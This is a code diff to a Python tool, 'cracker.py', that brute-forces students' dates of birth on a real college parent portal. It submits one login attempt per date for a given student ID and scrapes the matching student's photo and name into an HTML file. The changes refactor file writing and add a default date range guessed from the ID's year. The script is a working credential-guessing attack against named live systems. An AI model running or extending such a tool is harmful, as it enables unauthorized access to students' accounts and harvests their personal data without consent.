@@ -5,8 +5,6 @@ import aiohttp
 import asyncio
 import typer
 from rich.progress import Progress
-from rich.console import Console
-
 import bs4
 
 
@@ -16,7 +14,8 @@ def getcookies(session):
 
 def scrape(text):
     soup = bs4.BeautifulSoup(text, "lxml")
-    main_data = soup.div(attrs={"class": "uk-card uk-card-body cn-stu-data cn-stu-data1"})[0]
+    main_data = soup.div(
+        attrs={"class": "uk-card uk-card-body cn-stu-data cn-stu-data1"})[0]
     return "https://sims.sit.ac.in/parents/" + main_data.img.get("src"), main_data.h3.text
 
 
@@ -46,6 +45,7 @@ headers = {
     "Origin": "https://sit.ac.in",
     "Content-Type": "application/x-www-form-urlencoded",
     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
+
 }
 
 
@@ -72,28 +72,18 @@ class GenerateDate:
 
 
 class Cracker_linear():
-    def __init__(self, usn: str, start_date: datetime.date, end_date: datetime.date = datetime.date.today(), callback=None, progress_bar=True):
+    def __init__(self, usn: str, start_date: datetime.date, end_date: datetime.date = datetime.date.today()):
         self.start = start_date-datetime.timedelta(1)
         self.end = end_date
         self.usn = usn
-        self.progress_bar = progress_bar
         self.user_data = GenerateDate(self.start, self.end, self.usn)
         self.session = requests.Session()
-        self.console: Console = Console()
-
-        if os.path.exists("usn.html") and os.stat("usn.html").st_size != 0:
-            self.file = open("usn.html", "a")
-        else:
-            self.file = open("usn.html", "w")
-            self.file.write(
-                """<body style="display: flex;flex-direction: column;">""")
-        self.callback = callback
 
     def cracker(self):
         with Progress(refresh_per_second=25, speed_estimate_period=10) as progress:
             task1 = progress.add_task(
                 f"Checking Status...\nUSN:{self.usn} from -> {(self.start+datetime.timedelta(1)).strftime('%d/%m/%Y')} to -> {self.end.strftime('%d/%m/%Y')}", total=self.user_data.number_days.days)
-            self.count = 1
+
             for user in self.user_data:
 
                 rv = self.session.post(
@@ -102,26 +92,17 @@ class Cracker_linear():
                 if rv.find("<option") == -1:
 
                     scrp_temp = scrape(rv)
-                    self.file.write(
+                    write_to_file(
                         addtohtml([self.usn, user[29:39], scrp_temp[0], scrp_temp[1]]))
-
-                    if self.callback != None:
-                        self.callback(self.user_data.number_days.days,
-                                      self.user_data.number_days.days)
 
                     progress.update(task1, completed=1, visible=0)
 
-                    self.file.close()
                     print(scrp_temp[1], user[29:39],
                           scrp_temp[0], " (added to usn.html)")
                     return (self.usn, user[29:39])
 
                 progress.update(
                     task1, advance=1, description=f"{self.usn} [red]-->[/red] {user[3:5]}/{user[9:11]}/{user[17:21]}")
-                if self.callback != None:
-                    self.callback(self.count, self.user_data.number_days.days)
-
-                self.count += 1
 
             print(
                 "No match", f"{self.usn} --> {(self.start + datetime.timedelta(1) ).strftime('%d/%m/%Y')} to {self.end.strftime('%d/%m/%Y')} ")
@@ -134,36 +115,33 @@ class Cracker_linear():
             pass
 
 
+def write_to_file(data: str):
+    if os.path.exists("usn.html") and os.stat("usn.html").st_size != 0:
+        file = open("usn.html", "a")
+    else:
+        file = open("usn.html", "w")
+        file.write("""<body style="display: flex;flex-direction: column;">""")
+    file.write(data)
+    file.close()
+
+
 class Cracker_asyn():
-    def __init__(self, usn: str, start_date: datetime.date, end_date: datetime.date = datetime.date.today(), state: int = 5, callback=None, progress_bar=True):
+    def __init__(self, usn: str, start_date: datetime.date, end_date: datetime.date = datetime.date.today(), state: int = 5, progress_bar=True):
         self.start = start_date-datetime.timedelta(1)
         self.end = end_date
         self.usn = usn
         self.user_data = GenerateDate(self.start, self.end, self.usn)
         self.state = state
-        self.progress_bar = progress_bar
-        self.console: Console = Console()
         self.session = requests.Session()
-        if os.path.exists("usn.html") and os.stat("usn.html").st_size != 0:
-            self.file = open("usn.html", "a")
-        else:
-            self.file = open("usn.html", "w")
-            self.file.write(
-                """<body style="display: flex;flex-direction: column;">""")
-
-        self.callback = callback
 
     async def cracker_asyn(self):
         self.tasks = []
-        #self.progress:tqdm=tqdm(total=self.user_data.number_days.days,mininterval=0,dynamic_ncols=1,unit='day',desc=self.usn+" ",disable=not self.progress_bar)
-        self.count = 1
         self.progress = Progress()
         self.b = self.progress.add_task(total=self.user_data.number_days.days, visible=0,
                                         description=f"Checking Status...\nUSN:{self.usn} from -> {self.start.strftime('%Y-%m-%d')} to -> {self.end.strftime('%Y-%m-%d')}")
         self.found = 0
         async with aiohttp.ClientSession(headers=headers, cookies=getcookies(requests)) as session:
-            with self.progress as p:
-
+            with self.progress as _:
                 for _ in range(0, self.state):
                     self.tasks.append(self.cracker_asyn_fetch(session))
             await asyncio.gather(*self.tasks)
@@ -182,28 +160,14 @@ class Cracker_asyn():
 
                     if rv.find("<option") == -1:
                         scrp_temp = scrape(rv)
-                        self.file.write(
+                        write_to_file(
                             addtohtml([self.usn, user[29:39], scrp_temp[0], scrp_temp[1]]))
-                        if self.callback != None:
-                            self.callback(
-                                self.user_data.number_days.days, self.data.number_days.days)
 
                         p.update(self.b, completed=1, visible=0)
                         print(scrp_temp[1], user[29:39],
                               scrp_temp[0], " (added to usn.html)")
                         self.found = 1
-                        self.file.close()
                         return (self.usn, user[29:39])
-
-                    if self.callback != None:
-                        self.callback(
-                            self.count, self.data[id].number_days.days)
-
-                    self.count += 1
-
-                    # self.progress.update(1)
-                    #self.progress.desc=user[49:59]+" -> "+user[29:39]
-            # self.progress.close()
 
         if not self.found:
             print(
@@ -229,28 +193,7 @@ def check_date(t, dates: str):
         t.echo(f"Invalid date {dates} {e}")
 
 
-app = typer.Typer()
-
-
-def linear(usn: str, start_date: str, end_date: str):
-    """It check each date in order whether it match , if it match it stop and prints the result , some time slow. 
-
-    Args: \n
-        usn (str): usn to find the date of birth \n
-        start_date (str): at which date to start checking \n
-        end_date (str): at which date to end.
-    """
-    start_date = check_date(typer, start_date)
-    if end_date is None:
-        end_date = datetime.date.today()
-    else:
-        end_date = check_date(typer, end_date)
-
-    Cracker_linear(usn.upper(), start_date, end_date).start_crack()
-
-
-@app.command()
-def parallel(type: str = "p", usn: str = typer.Option(..., prompt=True), start: str = typer.Option(..., prompt=True), end: str = typer.Option(..., prompt=True)):
+def main(type: str = "p", usn: str = typer.Option(..., prompt=True), start: str = None, end: str = None):
     """It send the requests near at same time but wait for results ,some time faster recommended 
 
     Args: \n
@@ -260,13 +203,17 @@ def parallel(type: str = "p", usn: str = typer.Option(..., prompt=True), start: 
         end_date (str): at which date to end.
 
         ex:
-            python3 cracker.py --type f --usn [usn] --start [start_date] --end [end_date]
+            python3 cracker.py --type f --usn { usn } --start [start_date] --end [end_date]
     """
+    if start is None:
+        start = "01/01/20"+str(addzero(int(usn[3:5])-18))
+
     start = check_date(typer, start)
+
     if end is None:
-        end = datetime.date.today()
-    else:
-        end = check_date(typer, end)
+        end = "01/01/20"+str(addzero(int(usn[3:5])-17))
+
+    end = check_date(typer, end)
 
     if end < start:
         typer.echo("Invalid date provided")
@@ -277,4 +224,4 @@ def parallel(type: str = "p", usn: str = typer.Option(..., prompt=True), start: 
 
 
 if __name__ == "__main__":
-    typer.run(parallel)
+    typer.run(main)
